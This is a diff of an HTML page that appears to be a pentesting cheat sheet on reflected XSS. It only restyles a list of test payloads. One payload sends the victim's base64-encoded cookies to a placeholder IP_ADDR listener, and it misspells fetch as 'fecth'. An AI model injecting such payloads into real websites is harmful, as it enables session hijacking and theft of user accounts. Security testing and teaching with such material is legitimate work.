@@ -90,20 +90,16 @@
 <summary>REFLECTED TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> It is when data is retrieved in the webpage without any restriction. So it can be used to exfiltrate
 information, stole information, etc. </p>
-<p>
-<b>COMMON TESTS:</b>
+<p><b>COMMON TESTS:</b>
 
-&lt;h1&gt;TEST&lt;/h1&gt; || NORMAL TEST TO KNOW IF VULNERABILITY EXIST</blockquote>
+<mark>&lt;h1&gt;TEST&lt;/h1&gt;</mark> || NORMAL TEST TO KNOW IF VULNERABILITY EXIST</blockquote>
 	
-&lt;script&gt;alert('XSS');&lt;/script&gt; || NORMAL TEST TO KNOW IF VULNERABILITY EXIST	
+<mark>&lt;script&gt;alert('XSS');&lt;/script&gt;</mark> || NORMAL TEST TO KNOW IF VULNERABILITY EXIST	
 
-&lt;script&gt;alert(document.cookie);&lt;/script&gt; || NORMAL TEST TO RETRIEVE COOKIES
+<mark>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</mark> || NORMAL TEST TO RETRIEVE COOKIES
 
-&lt;script&gt;fecth('http://IP_ADDR/${btoa(document.cookie)}');&lt;/script&gt; || STOLE ENCODED BASE64 COOKIE
+<mark>&lt;script&gt;fecth('http://IP_ADDR/${btoa(document.cookie)}');&lt;/script&gt;</mark> || STOLE ENCODED BASE64 COOKIE
 *for this to work, it is needed a python server or any listener to retrieve the content.
-
-
-
 	
 </p>
 </details>
